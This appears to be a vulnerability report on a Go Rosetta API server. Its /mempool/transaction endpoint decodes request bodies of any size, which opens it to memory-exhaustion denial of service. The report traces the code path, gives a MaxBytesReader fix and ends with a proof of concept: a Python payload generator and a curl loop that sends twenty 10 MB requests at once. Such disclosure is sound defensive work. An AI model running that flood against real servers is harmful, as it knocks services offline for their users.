### Title
Unbounded Request Body Allocation in `/mempool/transaction` Enables Unauthenticated DoS via Memory Exhaustion

### Summary
The `MempoolTransaction()` handler in `rosetta/app/services/mempool_service.go` immediately discards its request parameter and returns `ErrNotImplemented`, but the upstream `rosetta-sdk-go` `MempoolAPIController` fully reads and JSON-decodes the HTTP request body before invoking the service method. Because no `http.MaxBytesReader` or equivalent body-size cap is applied anywhere in the middleware chain or HTTP server configuration, an unauthenticated attacker can POST arbitrarily large payloads to `/mempool/transaction`, causing the Go JSON decoder to allocate heap memory proportional to the body size and potentially exhausting server memory.

### Finding Description

**Exact code path:**

`rosetta/app/services/mempool_service.go` lines 30–34 — the service method accepts `_ *types.MempoolTransactionRequest` (blank identifier) and immediately returns without inspecting the request:

```go
func (m *mempoolAPIService) MempoolTransaction(
    _ context.Context,
    _ *types.MempoolTransactionRequest,
) (*types.MempoolTransactionResponse, *types.Error) {
    return nil, errors.ErrNotImplemented
}
```

The `rosetta-sdk-go` `MempoolAPIController` (an external dependency wired in `rosetta/main.go` line 90) reads the full HTTP body and calls `json.NewDecoder(r.Body).Decode(&mempoolTransactionRequest)` before the asserter or service are invoked. Only after successful JSON decoding does it call `MempoolTransaction()`.

**No body-size limit anywhere in the stack:**

`rosetta/main.go` lines 220–227 configure the `http.Server` with only time-based timeouts (`ReadTimeout`, `WriteTimeout`, `IdleTimeout`, `ReadHeaderTimeout`). No `http.MaxBytesReader` wraps the request body at any point:

```go
httpServer := &http.Server{
    Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
    Handler:           corsMiddleware,
    IdleTimeout:       rosettaConfig.Http.IdleTimeout,
    ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
    ReadTimeout:       rosettaConfig.Http.ReadTimeout,
    WriteTimeout:      rosettaConfig.Http.WriteTimeout,
}
```

A grep for `MaxBytesReader`, `LimitReader`, `maxBodySize`, or `ReadLimit` across the entire repository returns zero matches.

The middleware chain (`MetricsMiddleware` → `TracingMiddleware` → `CorsMiddleware` → router) adds no body-size enforcement either (`rosetta/app/middleware/metrics.go` lines 76–83, `rosetta/main.go` lines 217–219).

**Root cause:** The service-layer discard of the request is irrelevant to memory allocation; the controller layer allocates a buffer for the full body before the service is ever called. The failed assumption is that "discarding the request in the service" prevents resource consumption — it does not.

### Impact Explanation
An attacker sending a single POST to `/mempool/transaction` with a multi-megabyte `TransactionIdentifier.Hash` string forces the Go runtime to allocate a contiguous heap buffer of that size. Sending multiple concurrent such requests (the endpoint requires no authentication) can exhaust available heap memory, triggering OOM-kill of the process or causing severe GC pressure that degrades all endpoints. This is a complete denial-of-service against the Rosetta API node, preventing any gossip transaction lookups or block queries.

### Likelihood Explanation
The endpoint is publicly reachable with no authentication, no API key, and no rate limiting enforced at the application layer (the optional Traefik `inFlightReq: amount: 5` in the Helm chart is a deployment-level opt-in, not a built-in protection). Any unprivileged external user with a standard HTTP client can trigger this. The attack is trivially repeatable and scriptable with a single `curl` command. Time-based `ReadTimeout` provides only weak mitigation: on a 100 Mbps connection a 5-second timeout still allows ~62 MB per request; five concurrent connections deliver ~310 MB per round.

### Recommendation
1. Wrap every request body with `http.MaxBytesReader` in a middleware applied before routing, e.g.:
   ```go
   func maxBodyMiddleware(next http.Handler, limit int64) http.Handler {
       return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
           r.Body = http.MaxBytesReader(w, r.Body, limit)
           next.ServeHTTP(w, r)
       })
   }
   ```
   Apply this in `rosetta/main.go` before `server.CorsMiddleware`.
2. Add a configurable `maxBodyBytes` field to the `Http` config struct in `rosetta/app/config/types.go` with a safe default (e.g., 1 MB).
3. For the `/mempool/transaction` and `/mempool` endpoints specifically, consider returning `ErrNotImplemented` at the HTTP routing layer before body parsing occurs, bypassing the controller's JSON decode entirely.

### Proof of Concept
```bash
# Generate a ~10 MB payload with an oversized hash field
python3 -c "
import json, sys
payload = {
  'network_identifier': {'blockchain': 'Hedera', 'network': 'mainnet'},
  'transaction_identifier': {'hash': 'A' * 10_000_000}
}
sys.stdout.write(json.dumps(payload))
" > /tmp/large_payload.json

# Send to the Rosetta mempool/transaction endpoint (no auth required)
curl -s -o /dev/null -w "%{http_code} %{size_upload}\n" \
  -X POST http://<rosetta-host>:5700/mempool/transaction \
  -H 'Content-Type: application/json' \
  --data-binary @/tmp/large_payload.json

# Repeat concurrently to amplify heap pressure
for i in $(seq 1 20); do
  curl -s -o /dev/null -X POST http://<rosetta-host>:5700/mempool/transaction \
    -H 'Content-Type: application/json' \
    --data-binary @/tmp/large_payload.json &
done
wait
```

Each request forces the Go JSON decoder to allocate ~10 MB on the heap before `MempoolTransaction()` is called and the request is discarded. Twenty concurrent requests allocate ~200 MB simultaneously; scaling the payload or concurrency exhausts available memory. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** rosetta/app/services/mempool_service.go (L30-34)
```go
func (m *mempoolAPIService) MempoolTransaction(
	_ context.Context,
	_ *types.MempoolTransactionRequest,
) (*types.MempoolTransactionResponse, *types.Error) {
	return nil, errors.ErrNotImplemented
```

**File:** rosetta/main.go (L89-90)
```go
	mempoolAPIService := services.NewMempoolAPIService()
	mempoolAPIController := server.NewMempoolAPIController(mempoolAPIService, asserter)
```

**File:** rosetta/main.go (L217-219)
```go
	metricsMiddleware := middleware.MetricsMiddleware(router)
	tracingMiddleware := middleware.TracingMiddleware(metricsMiddleware)
	corsMiddleware := server.CorsMiddleware(tracingMiddleware)
```

**File:** rosetta/main.go (L220-227)
```go
	httpServer := &http.Server{
		Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
		Handler:           corsMiddleware,
		IdleTimeout:       rosettaConfig.Http.IdleTimeout,
		ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
		ReadTimeout:       rosettaConfig.Http.ReadTimeout,
		WriteTimeout:      rosettaConfig.Http.WriteTimeout,
	}
```

**File:** rosetta/app/middleware/metrics.go (L76-83)
```go
func MetricsMiddleware(next http.Handler) http.Handler {
	return middleware.Instrument{
		Duration:         requestDurationHistogram,
		InflightRequests: requestInflightGauge,
		RequestBodySize:  requestBytesHistogram,
		ResponseBodySize: responseBytesHistogram,
		RouteMatcher:     next.(middleware.RouteMatcher),
	}.Wrap(next)
```

**File:** rosetta/app/config/types.go (L64-69)
```go
type Http struct {
	IdleTimeout       time.Duration `yaml:"idleTimeout"`
	ReadTimeout       time.Duration `yaml:"readTimeout"`
	ReadHeaderTimeout time.Duration `yaml:"readHeaderTimeout"`
	WriteTimeout      time.Duration `yaml:"writeTimeout"`
}
```
